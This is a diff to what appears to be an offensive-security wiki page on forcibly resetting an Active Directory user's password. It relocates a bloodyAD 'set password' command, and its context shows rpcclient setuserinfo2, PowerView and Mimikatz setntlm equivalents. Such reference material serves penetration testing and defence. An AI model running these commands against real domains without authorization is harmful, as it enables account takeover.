@@ -23,6 +23,12 @@ The [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.ht
 rpcclient -U $DOMAIN/$ControlledUser $DomainController
 rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
 ```
+
+Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password $TargetUser $NewPassword
+```
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -34,13 +40,6 @@ Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 ```
 
 Mimikatz's [`lsadump::setntlm`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/setntlm) can also be used for that purpose.
-{% endtab %}
-
-{% tab title="Windows/UNIX-like" %}
-It can also be achieved with a python tool as [bloodyAD](https://github.com/CravateRouge/bloodyAD).
-```bash
-bloodyAD --host $DomainController -d $DOMAIN -u $ControlledUser -p $Password set password $TargetUser $NewPassword
-```
 {% endtab %}
 
 {% endtabs %}
